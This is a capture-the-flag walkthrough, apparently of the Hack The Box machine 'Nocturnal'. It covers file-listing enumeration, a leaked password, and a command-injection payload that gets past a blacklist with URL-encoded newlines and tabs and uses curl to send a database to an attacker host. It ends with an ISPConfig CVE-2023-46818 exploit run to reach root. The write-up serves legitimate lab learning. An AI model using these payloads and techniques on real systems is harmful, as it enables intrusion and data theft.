## ENUM :

Open ports

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

dirb result:

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jul 10 13:54:38 2025
URL_BASE: http://nocturnal.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://nocturnal.htb/ ----                                                                                                                                                                                                      + http://nocturnal.htb/admin.php (CODE:302|SIZE:0)                                                                                                                                                                                         
==> DIRECTORY: http://nocturnal.htb/backups/                                                                                                                                                                                               
+ http://nocturnal.htb/index.php (CODE:200|SIZE:1524)                                                                                                             
---- Entering directory: http://nocturnal.htb/backups/ ----

-----------------
END_TIME: Thu Jul 10 14:02:40 2025
DOWNLOADED: 9224 - FOUND: 2
```

No subdomain detected

I move on to using the service by analyzing it with Burp

I find the page: `http://nocturnal.htb/dashboard.php` which allows file upload, this is likely the vulnerability.

I try, but I can only download the file back, however I analyze the provided link:

`/view.php?username=zeroz&file=payload.php.pdf`

I will run several tests, what happens if I put in a non-existent file?

It returns an extension error. Now, is it possible to list all files by their extensions?

`/view.php?username=zeroz&file=*.pdf`

Yes! And that’s good news! Because with some luck, I can list the files of all the other users by using BurpSuite Intruder.

---

## Initial access / Own user

I will make 2 lists: one for extensions and a random wordlist from the internet with names.

When uploading a PHP file, I get this message:
`Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.`

So I have my first list, and I also have the second on my Kali:
`/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`

I’ll then run a “Cluster Bomb Attack” with Intruder.

I find 2 users:
`admin` and `amanda`

Worth digging! I run a lighter scan on those 2 users.

I find the file: `privacy.odt` on Amanda’s account

```
Dear Amanda,

Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.

The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.

Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

  

Yours sincerely,

Nocturnal's IT team
```

So I found this password: `arHkG7HAI68X8s1J`

I can connect as Amanda and access the admin panel.

I inspect the files and one part catches my eye:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

The password is directly inserted into the shell command!
There is a filtering function:

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```

But I doubt it’s unbreakable!

```
[';', '&', '|', '$', ' ', '`', '{', '}', '&&']
```

Despite the blacklist, nothing protects against **new lines (`%0a`)** or **tabs (`%09`)** when URL-encoded:

* `%0a` injects a line break (`\n`)
* `%09` injects a tab (`\t`), used as space in shell

The goal is to break out of the zip command to execute code directly.

And I have all the pieces! However, I couldn’t get a reverse shell, so instead I’ll execute small commands for exfiltration.

I find: `../nocturnal_database/nocturnal_database.db`

I manage to download it via my extraction script + curl:

```
password=%0abash%09-c%09"curl%09-F%09data=@../nocturnal_database/nocturnal_database.db%09http://ip:port"%0a&backup=
```

I analyze it on my machine (important to note that I also saw this in `register.php`: `$password = md5($_POST['password']);` → passwords are MD5 hashes).

![alt text](note/ctf/asset/HTB_Noctural.png)

I copy them all and use Crackstation:

| user    | password             |
| ------- | -------------------- |
| admin   | not found            |
| amanda  | not found            |
| tobias  | slowmotionapocalypse |
| kavi    | kavi                 |
| e0Al5   | not found            |
| hola    | hola                 |
| zeroz   | test                 |
| elix    | elix                 |
| test    | test                 |
| toto    | Qwerty12345!         |
| transit | 1234                 |

I assume one of these accounts must be valid, but I’m mainly looking for which one gives me SSH access, so I exfiltrate `/etc/passwd`:

```
cat passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
```

Perfect! I have credentials:
`tobias : slowmotionapocalypse`

---

## Own root

#### linpeas :

Cron checked:
`-rw-r--r--   1 root root 2473 Oct 18  2024 sendmail`

Open ports:

```
127.0.0.1:8080 (web service)
127.0.0.1:3306 (MySQL)
127.0.0.1:33060
127.0.0.1:587
127.0.0.1:25
```

Users with shell:

```
root:x:0:0:root:/root:/bin/bash
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
```

Likely related service:

```
/var/www/ispconfig
/usr/local/ispconfig
```

Mail applications:

```
sendmail
sendmail-msp
sendmail-mta
```

#### Exploit

I check the service by doing a port forward:
`ssh -L 8080:127.0.0.1:8080 tobias@10.10.11.64`

I land on an ISPConfig interface, version `3.2.10p1`, which is vulnerable to **CVE-2023-46818**.

Tobias + his password doesn’t work, I try `admin` with Tobias’ password and it works.

I can exploit the CVE! → [https://github.com/ajdumanhug/CVE-2023-46818](https://github.com/ajdumanhug/CVE-2023-46818)

`python exploit.py http://localhost:8080 admin slowmotionapocalypse`

And I get root!

```
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
...
ispconfig-shell# whoami
root

ispconfig-shell# cat /root/root.txt
1553099a6f18b90469778a90e420f82e
```